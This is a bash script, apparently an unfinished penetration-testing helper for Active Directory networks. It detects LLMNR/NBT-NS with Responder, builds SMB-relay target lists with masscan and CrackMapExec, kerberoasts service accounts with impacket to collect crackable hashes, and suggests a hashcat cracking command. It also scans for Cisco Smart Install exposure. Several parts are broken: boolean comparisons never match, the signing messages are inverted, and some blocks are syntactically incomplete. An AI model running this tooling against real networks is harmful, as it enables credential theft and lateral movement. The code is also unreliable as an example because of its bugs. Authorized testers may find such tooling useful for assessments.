#!/bin/bash
### To do marked with ***

function smbRelay() {
    # Checks if LLMNR and/or NBT-NS are enabled on the network. Then scans hosts
    # for open TCP/445 and uses CME's gen-relay-list to get a list of targets.
    SMBRELAYPROTOS=false            # Setup vars to use in final comparison
    SMBRELAYMESSAGESIGNING=false
    echo "How long do you want to wait for LLMNR/NBT-NS traffic (seconds)?"
    read DURATION # Ideally I'd watch Responder's output for a request to come through, but this will do for now
    echo "[+] Checking for LLMNR & NBT-NS. I'll be back in $DURATION seconds..."
    (python /opt/Responder/Responder.py -I eth0 -A &) &> /dev/null # Spawn Responder in analyze mode and mute output
    sleep $DURATION
    pkill -f "Responder" &> /dev/null # Kill the Responder process after N seconds
    if grep "[Analyze mode: LLMNR]" /opt/Responder/logs/Analyzer-Session.log &> /dev/null; then # Parse the Analyzer session logs for any poisoned traffic
        echo "[+] Found LLMNR!"
        SMBRELAYPROTOS=true
    elif grep "[*]  [NBT-NS]" /opt/Responder/logs/Analyzer-Session.log &> /dev/null; then
        echo "[+] Found NBT-NS!"
        SMBRELAYPROTOS=true
    else
        echo "[-] Broadcast protocols not found in the timeframe specified :( Maybe try capturing a little longer?"
    fi
    echo "[+] Checking for hosts with SMB message signing disabled"
    masscan -p445 -iL $1 -oG open445.txt # Massscan over Nmap here in case larget subnets are used
    grep "Host" open445.txt | awk '{print $2}' > open445.tmp && mv open445.tmp open445.txt # Parse out  IP addresses
    cme smb open445.txt --gen-relay-list SmbSigningDisabled.txt # Use CME to check for SMB signing
    if [[ $(wc -l <SmbSigningDisabled.txt) -gt 0 ]]; then
        echo "[+] SMB signing is enabled!";
        SMBRELAYMESSAGESIGNING=true
    else
        echo "[-] SMB signing is disabled :("
    fi
    #Final check
    if [ "$SMBRELAYPROTOS" == "True" ]; then
        if [ "$SMBRELAYMESSAGESIGNING" == "True" ]; then
            echo "[!] SMB relaying looks like a valid vector! Let's do it!"
        else
            echo "[-] LLMNR is present, but we couldn't find hosts to relay to :("
        fi
    else
        echo "[-] LLMNR and NBT-NS weren't detected :("
    fi
}

function kerberoast() {
  # Collects kerberos SPNs after getting information about the user to use
  echo "[+] We'll need some information first:"
  echo "What is the name of the domain? (ex. ad.example.com)"
  read KERBDOMAIN
  echo "What domain user would you like to use? (ex. jdoe)"
  read KERBUSER
  python /opt/impacket/examples/GetUserSPNs.py -dc-ip $KERBDOMAIN -request $KERBDOMAIN/$KERBUSER -outputfile kerberos-hashes.txt > kerberoast-output.tmp
  cat kerberoast-output.tmp | grep -v "Error" > kerberoast-users.txt
  rm kerberoast-output.tmp
  echo "[!] Collected `wc -l <kerberos-hashes.txt` hashes and stored them in kerberos-hashes.txt for cracking!"
  echo "[!] Use 'hashcat -m 13100 -a 0 kerberos-hashes.txt wordlists/epic_list -r rules/d3ad0ne.rule -o $KERBDOMAIN.txt'"
  echo "[!] Users and roles are stored in kerberoast-users.txt"
}

function smartInstall() {
  # Checks for open port 4786 to use with SIET
  echo "[+] Checking for open port 4786 in the range"
  nmap -p4786 -iL $1 -oG open4786.gnmap
  grep "Host:" open4786.gnmap | grep "4786/open/tcp" | awk '{print $2}' > open4786.txt
  if [[ $(wc -l <open4786.txt) -gt 0 ]]; then
    echo "[+] Found `wc -l <open4786.txt` hosts with Cisco Smart Install enabled!";
  else
    echo "[-] Didn't find any hosts with Cisco Smart Install enabled :("
}

function nullSessionEnum() { #WIP
  # Checks for user enumeration via null sessions on the domain controller
  echo "[+] Finding domain controllers..."
  DOMAIN=$(grep "source" /etc/resolv.conf | awk '{print $2}')
  echo "[+] Domain identified as $DOMAIN"
  DOMAINCONTROLLERS=$(nslookup -type=srv _ldap._tcp.dc._msdcs.$DOMAIN ) #*** Guess at syntax. Fix me!
  echo "[!] Found domain controllers:"
  echo $DOMAINCONTROLLERS
  echo "[+] Checking if the domain controllers support null sessions"
  for dc in $DOMAINCONTROLLERS
    echo "[+] Checking $dc for null session support..."
    #*** Check here for null session support
    #if output = valid; then
    #  echo "[+] Null sessions supported. Grabbing users..."
    #  do rpcclient -U "%" -W $DOMAIN -c enumdomusers $dc
    #else
    #  echo "[-] Null sessions not supported on $dc"
  done
}

#function buildRange() {
     # We can probably build out our own scope using reverse DNS.
#    LOCALNET=ip route | grep "/" | awk '{print $1}' # Get local net from ip route
#    DOMAIN=`grep "search" /etc/resolv.conf | awk '{print $2}'` # Get domain from resolv.conf
#    #*** Add reverse DNS w/ dnsrecon/dnsenum
#    #*** Parse collected IPs, split to /24s, dedup, then store in a file
#}